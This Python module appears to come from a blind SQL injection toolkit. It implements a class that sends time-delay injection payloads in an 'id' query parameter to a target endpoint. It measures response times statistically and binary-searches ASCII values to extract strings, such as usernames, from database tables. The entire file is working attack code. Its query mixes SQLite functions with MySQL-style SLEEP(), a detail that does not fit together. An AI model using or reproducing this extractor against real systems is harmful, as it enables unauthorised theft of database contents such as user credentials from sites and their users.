"""
Character extraction using binary search algorithm.
Finds characters faster than linear search by using binary search.
"""

from typing import Optional, List
import time
import re
import requests
from .stats import TimingAnalyzer


class BinarySearchExtractor:
    """Extracts characters using binary search instead of linear search."""
    
    def __init__(self, base_url: str, payload_template: str, 
                 delay_seconds: float = 2.0, analyzer: Optional[TimingAnalyzer] = None):
        """
        Initialize the extractor.
        
        Args:
            base_url: Base URL of vulnerable endpoint
            payload_template: SQL injection payload template with {condition} placeholder
            delay_seconds: Base delay to use in SQL SLEEP() functions
            analyzer: TimingAnalyzer instance (creates default if None)
        """
        self.base_url = base_url
        self.payload_template = payload_template
        self.delay_seconds = delay_seconds
        self.analyzer = analyzer or TimingAnalyzer()
        self.session = requests.Session()
        
        # Cache for timing measurements
        self.baseline_cache: Optional[List[float]] = None
    
    def _measure_request_time(self, payload: str, samples: int = 5) -> List[float]:
        """
        Measure request timing multiple times for statistical reliability.
        
        Args:
            payload: Complete payload to send
            samples: Number of samples to collect
            
        Returns:
            List of timing measurements
        """
        # Extract base URL without query parameters
        if '?' in self.base_url:
            url = self.base_url.split('?')[0]
        else:
            url = self.base_url
        
        timings = []
        for _ in range(samples):
            start = time.time()
            try:
                self.session.get(url, params={'id': payload}, timeout=30)
            except requests.RequestException:
                pass
            timings.append(time.time() - start)
        return timings
    
    def _establish_baseline(self, samples: int = 15) -> List[float]:
        """
        Establish baseline timing by measuring requests without delays.
        
        Args:
            samples: Number of baseline samples
            
        Returns:
            List of baseline timing measurements
        """
        if self.baseline_cache is not None:
            return self.baseline_cache
        
        # Use a condition that's always false (no delay)
        baseline_payload = self.payload_template.format(condition="1=0")
        baseline_timings = self._measure_request_time(baseline_payload, samples)
        self.baseline_cache = baseline_timings
        return baseline_timings
    
    def _test_condition(self, condition: str, samples: int = 7) -> bool:
        """
        Test if a SQL condition is true by measuring timing.
        
        Args:
            condition: SQL condition to test (e.g., "ASCII(SUBSTRING(...)) > 64")
            samples: Number of samples to collect
            
        Returns:
            True if condition appears to be true (significant delay detected)
        """
        # Establish baseline if needed
        baseline = self._establish_baseline()
        
        # Create payload with delay if condition is true
        # Format: condition can include SLEEP() or the template handles it
        if "SLEEP" in self.payload_template.upper():
            # Template already includes SLEEP, replace hardcoded delay with detected delay
            # Pattern: SLEEP(any_number) -> SLEEP(delay_seconds)
            payload_template = re.sub(
                r'SLEEP\([0-9.]+\)',
                f'SLEEP({self.delay_seconds})',
                self.payload_template,
                flags=re.IGNORECASE
            )
            payload = payload_template.format(condition=condition)
        elif "SLEEP" not in condition.upper():
            # Template doesn't have SLEEP, add it to the condition
            payload = self.payload_template.format(
                condition=f"({condition}) AND SLEEP({self.delay_seconds})"
            )
        else:
            # Condition already includes delay logic
            payload = self.payload_template.format(condition=condition)
        
        test_timings = self._measure_request_time(payload, samples)
        
        # Use statistical test to determine significance
        is_significant, p_value = self.analyzer.is_significant_delay(
            baseline, test_timings
        )
        
        return is_significant
    
    def extract_character_binary(self, position: int, table: str = "users", 
                                 column: str = "username", 
                                 where_clause: str = "1=1") -> Optional[str]:
        """
        Extract a single character at a position using binary search.
        
        Args:
            position: Character position (1-indexed)
            table: Table name to query
            column: Column name to extract from
            where_clause: WHERE clause for the query
            
        Returns:
            Extracted character or None if not found
        """
        # Binary search on ASCII range of printable characters
        # Typical range: 32 (space) to 126 (~) = 95 characters
        low = 32
        high = 126
        
        # Character extraction query template
        # Use SQLite-compatible functions: UNICODE() and SUBSTR()
        # For MySQL, would use: ASCII(SUBSTRING(...))
        char_query = f"UNICODE(SUBSTR((SELECT {column} FROM {table} WHERE {where_clause} LIMIT 1), {position}, 1))"
        
        # Binary search to find the exact character value
        # We're finding the maximum value where char >= value is true
        while low <= high:
            mid = (low + high) // 2
            
            # Test if character >= mid
            condition = f"{char_query} >= {mid}"
            if self._test_condition(condition):
                # Character is >= mid, so search in upper half
                low = mid + 1
            else:
                # Character is < mid, so search in lower half
                high = mid - 1
        
        # After loop exits: low > high
        # The binary search finds the maximum value where char >= value is true
        # When the loop exits:
        #   - low is the first value where char >= low was FALSE (or we ran out of range)
        #   - high is the last value where char >= high was TRUE
        # So the character value should be: high (since char >= high is true, but char < low)
        # However, due to timing errors, we verify a small range
        
        # The most likely candidate is high, but we also check high+1 and high-1
        # to handle timing errors
        candidates_to_test = []
        
        # Primary candidate: high (the last confirmed value where char >= high was true)
        if 32 <= high <= 126:
            candidates_to_test.append(high)
        
        # Also check high+1 (in case we stopped one early due to timing error)
        if high + 1 <= 126:
            candidates_to_test.append(high + 1)
        
        # Also check high-1 (in case we overshot due to timing error)
        if high - 1 >= 32:
            candidates_to_test.append(high - 1)
        
        # Remove duplicates and sort (test higher values first for efficiency)
        candidates_to_test = sorted(set(candidates_to_test), reverse=True)
        
        # Test each candidate and return the first one that matches
        for test_val in candidates_to_test:
            exact_condition = f"{char_query} = {test_val}"
            if self._test_condition(exact_condition):
                return chr(test_val)
        
        # If no exact match found (shouldn't happen often), return the most likely candidate
        if 32 <= high <= 126:
            return chr(high)
        
        # If high < 32, it means the character is not in printable range
        # Return None to indicate end of string
        return None
    
    def extract_string(self, table: str = "users", column: str = "username",
                      where_clause: str = "1=1", max_length: int = 100) -> str:
        """
        Extract a complete string by extracting characters sequentially.
        
        Args:
            table: Table name to query
            column: Column name to extract from
            where_clause: WHERE clause for the query
            max_length: Maximum string length to extract
            
        Returns:
            Extracted string
        """
        result = ""
        
        for position in range(1, max_length + 1):
            char = self.extract_character_binary(position, table, column, where_clause)
            if char is None:
                break
            result += char
            
            # Stop if we hit a null terminator or common delimiter
            if char in ['\x00', '\n', '\r']:
                break
            
            print(f"[*] Extracted so far: {result}", end='\r')
        
        print()  # New line after progress
        return result.rstrip('\x00\n\r')

